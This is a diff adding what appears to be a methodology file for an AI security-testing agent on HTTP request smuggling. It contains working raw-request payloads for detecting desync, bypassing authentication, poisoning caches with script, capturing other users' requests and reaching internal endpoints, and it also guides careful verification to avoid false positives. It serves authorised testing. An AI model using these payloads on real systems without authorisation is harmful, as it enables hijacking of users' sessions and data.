@@ -1,0 +1,350 @@
+<http_request_smuggling_guide>
+<title>HTTP REQUEST SMUGGLING AND DESYNC ATTACKS</title>
+
+<critical>HTTP request smuggling occurs when frontend and backend servers disagree on request boundaries, allowing attackers to inject requests that bypass security controls, poison caches, hijack other users' requests, and perform internal-only actions. This is a severe vulnerability that can turn a single HTTP request into full application compromise.</critical>
+
+<scope>
+- CL.TE: Frontend uses Content-Length, backend uses Transfer-Encoding
+- TE.CL: Frontend uses Transfer-Encoding, backend uses Content-Length
+- TE.TE: Both use Transfer-Encoding but with obfuscation/priority differences
+- HTTP/2 downgrade: HTTP/2 frontend to HTTP/1.1 backend desync
+- H2C smuggling: HTTP/2 cleartext upgrade exploitation
+- Request splitting: CRLF injection enabling request boundary manipulation
+- Browser-powered smuggling: Leveraging browser HTTP implementations
+</scope>
+
+<methodology>
+1. Identify the architecture: Determine if there are multiple HTTP processors (load balancer, WAF, reverse proxy, CDN, backend).
+2. Test for timing-based desync: Use differential timing to detect CL.TE or TE.CL conditions.
+3. Confirm smuggling capability: Demonstrate that a smuggled request affects subsequent responses.
+4. Prove impact: Show auth bypass, cache poisoning, or request hijacking.
+5. Document the exact payload and vulnerable configuration.
+6. Verify reproducibility (timing-dependent attacks may be inconsistent).
+</methodology>
+
+<discovery_techniques>
+<architecture_identification>
+- Check response headers for proxy indicators: Via, X-Forwarded-For, X-Cache, X-CDN
+- Compare responses at different endpoints for header variations
+- Identify load balancer/CDN: Akamai, Cloudflare, AWS ALB/ELB, HAProxy, nginx
+- Check for HTTP/2 support: ALPN negotiation, :authority pseudo-header
+</architecture_identification>
+
+<timing_based_detection>
+CL.TE detection:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 4
+Transfer-Encoding: chunked
+
+1
+Z
+Q
+```
+If vulnerable: Backend waits for more data (timeout delay)
+If not vulnerable: Immediate response
+
+TE.CL detection:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+X
+```
+If vulnerable: Backend processes X as next request (timeout or error on X)
+If not vulnerable: Immediate response
+</timing_based_detection>
+
+<http2_testing>
+- H2C smuggling: Upgrade header to HTTP/2 cleartext
+- HTTP/2 downgrade: Check if frontend HTTP/2 proxies to HTTP/1.1 backend
+- Header folding: Some HTTP/2 implementations mishandle line folding
+- Pseudo-header manipulation: :method, :path, :authority injection
+</http2_testing>
+</discovery_techniques>
+
+<smuggling_types>
+<cl_te>
+Frontend: Content-Length determines request end
+Backend: Transfer-Encoding (chunked) determines request end
+
+Payload:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 13
+Transfer-Encoding: chunked
+
+0
+
+SMUGGLED
+```
+Frontend sees full request (13 bytes of body)
+Backend sees: empty chunk (0\r\n\r\n), then "SMUGGLED" as next request prefix
+</cl_te>
+
+<te_cl>
+Frontend: Transfer-Encoding (chunked) determines request end
+Backend: Content-Length determines request end
+
+Payload:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 3
+Transfer-Encoding: chunked
+
+8
+SMUGGLED
+0
+
+```
+Frontend processes complete chunked body
+Backend sees only 3 bytes, "SMUGGLED..." prepends next request
+</te_cl>
+
+<te_te_obfuscation>
+Both support Transfer-Encoding but one can be confused:
+```
+Transfer-Encoding: chunked
+Transfer-encoding: identity
+```
+```
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+```
+```
+Transfer-Encoding: xchunked
+Transfer-Encoding: chunked
+```
+```
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+```
+Different parsers may select different headers
+</te_te_obfuscation>
+
+<http2_downgrade>
+HTTP/2 frontend may rewrite requests for HTTP/1.1 backend:
+- Request line constructed from pseudo-headers
+- CRLF in header values can inject new headers/requests
+- Body handling differences enable smuggling
+- Test: Inject CRLF in HTTP/2 header value
+</http2_downgrade>
+</smuggling_types>
+
+<exploitation>
+<auth_bypass>
+Smuggle request as authenticated user:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 130
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: target.com
+Cookie: [smuggled cookies from victim's next request]
+
+```
+The smuggled request "captures" the next user's headers
+</auth_bypass>
+
+<cache_poisoning>
+Poison cache with malicious response:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+GET /static/script.js HTTP/1.1
+Host: target.com
+Content-Length: 50
+
+<script>alert(1)</script>
+```
+Cache stores attacker's body as response to /static/script.js
+</cache_poisoning>
+
+<request_hijacking>
+Capture other users' requests:
+```
+POST /reflect HTTP/1.1
+Host: target.com
+Content-Length: 100
+Transfer-Encoding: chunked
+
+0
+
+POST /log HTTP/1.1
+Host: target.com
+Content-Length: 1000
+
+captured=
+```
+Next user's request becomes POST body, logged/reflected
+</request_hijacking>
+
+<internal_access>
+Access internal-only endpoints:
+```
+POST / HTTP/1.1
+Host: target.com
+Content-Length: 80
+Transfer-Encoding: chunked
+
+0
+
+GET /internal/admin HTTP/1.1
+Host: internal.target.com
+X-Internal: true
+
+```
+Frontend allows request, smuggled request to internal host
+</internal_access>
+</exploitation>
+
+<validation>
+1. Demonstrate actual request smuggling with response from smuggled request.
+2. Show timing differential confirming CL/TE disagreement.
+3. Prove impact: cache poisoning, auth bypass, or request capture.
+4. Document exact payload including all bytes (CRLF matters).
+5. Verify reproducibility (may require specific timing or conditions).
+6. Confirm the vulnerability is not a lab/testing environment artifact.
+</validation>
+
+<false_positives>
+- Timing differences due to network latency, not smuggling
+- Error responses from malformed requests (not smuggling)
+- Backend validation errors misinterpreted as smuggling
+- Single-server architectures where frontend/backend are the same
+- Proxy configurations that normalize headers before processing
+- Detection signatures catching but blocking smuggling attempts
+</false_positives>
+
+<llm_reasoning_errors>
+COMMON AI MISTAKES THAT CAUSE FALSE POSITIVES - AVOID THESE:
+
+1. SINGLE SERVER MISIDENTIFICATION:
+   WRONG: "Server accepts both CL and TE headers, smuggling possible"
+   RIGHT: Request smuggling requires TWO or more HTTP processors:
+          - Frontend (load balancer, CDN, proxy, WAF)
+          - Backend (application server)
+          Single server cannot have a desync WITH ITSELF.
+          Verify multi-tier architecture before claiming smuggling.
+
+2. TIMING WITHOUT SMUGGLING:
+   WRONG: "Request took longer with TE header, CL.TE confirmed"
+   RIGHT: Timing delays can occur for many reasons:
+          - Network latency variation
+          - Backend processing time
+          - Connection reuse timing
+          - Chunk parsing without desync
+          Prove ACTUAL smuggling with response from injected request.
+
+3. ERROR RESPONSE CONFUSION:
+   WRONG: "Server returned 400 Bad Request on TE payload, vulnerable"
+   RIGHT: 400 errors indicate the server REJECTED the malformed request:
+          - Proper validation = not vulnerable
+          - Error means smuggling did NOT occur
+          A successful smuggle returns SUCCESS for the first request.
+
+4. HEADER ACCEPTANCE VS EXPLOITATION:
+   WRONG: "Both CL and TE headers accepted, desync exists"
+   RIGHT: Both headers in one request is unusual but not automatically vulnerable:
+          - Server may use consistent logic (always CL, always TE)
+          - Headers may be normalized/removed by proxy
+          - Acceptance != disagreement
+          Demonstrate actual boundary confusion, not just header acceptance.
+
+5. LAB CONDITIONS:
+   WRONG: "Smuggling worked against my local proxy setup"
+   RIGHT: Local testing setups may have different configurations:
+          - Development proxies with lenient parsing
+          - Test configurations not matching production
+          - Network setups enabling attacks not possible remotely
+          Verify against the ACTUAL target infrastructure.
+
+6. CRLF INJECTION CONFLATION:
+   WRONG: "CRLF injection in header = request smuggling"
+   RIGHT: CRLF injection and smuggling are related but different:
+          - CRLF injection: Injecting headers into current request
+          - Request smuggling: Creating entirely new request
+          CRLF can enable smuggling but is not automatically smuggling.
+</llm_reasoning_errors>
+
+<expanded_false_positives>
+FALSE POSITIVE SCENARIOS - DO NOT REPORT:
+
+1. SINGLE-TIER ARCHITECTURES:
+   - Direct connection to application server
+   - No reverse proxy or load balancer
+   - CDN/WAF properly normalizing requests
+   - Headers stripped before reaching backend
+
+2. PROPER HEADER HANDLING:
+   - Server consistently using Content-Length only
+   - Server consistently using Transfer-Encoding only
+   - Transfer-Encoding not supported (HTTP/1.0 servers)
+   - Both headers present but same value/result
+
+3. BLOCKED SMUGGLING ATTEMPTS:
+   - WAF detecting and blocking smuggling patterns
+   - 400/413/431 errors on malformed requests
+   - Connection closed on suspicious patterns
+   - Request rejected without processing
+
+4. TIMING-ONLY ANOMALIES:
+   - Network latency causing timing variations
+   - Server processing time variations
+   - Keep-alive connection behavior
+   - No proof of actual smuggled request processing
+
+5. DEVELOPMENT/TESTING:
+   - Localhost or test environment
+   - Custom proxy configurations
+   - Lab setups not matching production
+   - Known vulnerable but sandboxed
+
+6. HTTP VERSION MISMATCH:
+   - HTTP/1.0 client to HTTP/1.1 server (but single server)
+   - Version negotiation differences without desync
+   - Protocol upgrade handling differences
+</expanded_false_positives>
+
+<impact>
+- Authentication bypass: Access accounts without credentials
+- Cache poisoning: Store malicious responses for all users
+- Request hijacking: Capture other users' requests and credentials
+- Internal access: Reach internal-only endpoints
+- WAF bypass: Skip security controls entirely
+- Session fixation: Inject cookies into other users' requests
+- Response queue poisoning: Corrupt responses for multiple users
+- Denial of service: Desync backend connections
+</impact>
+
+<pro_tips>
+1. Always verify multi-tier architecture before testing - single servers can't self-desync.
+2. Use Burp Suite's HTTP Request Smuggler extension for automated detection.
+3. CL.TE is more common; TE.CL requires backend chunk processing.
+4. HTTP/2 downgrade smuggling is increasingly common with modern infrastructure.
+5. Some CDNs have specific known smuggling vulnerabilities - research the target CDN.
+6. Timing-based detection can have false positives; always confirm with actual smuggling.
+7. Keep-alive connections are required for most smuggling attacks.
+8. The smuggled request should be a valid HTTP request (proper headers, line endings).
+9. Cache poisoning requires the cached resource to be cacheable (check Cache-Control).
+10. Response to smuggled request may be received on a DIFFERENT connection.
+</pro_tips>
+
+<remember>HTTP request smuggling requires demonstrating actual request boundary confusion between two or more HTTP processors. Timing anomalies, header acceptance, or error responses are not proof. Show that a smuggled request executes and produces observable impact like cache poisoning or request hijacking.</remember>
+</http_request_smuggling_guide>
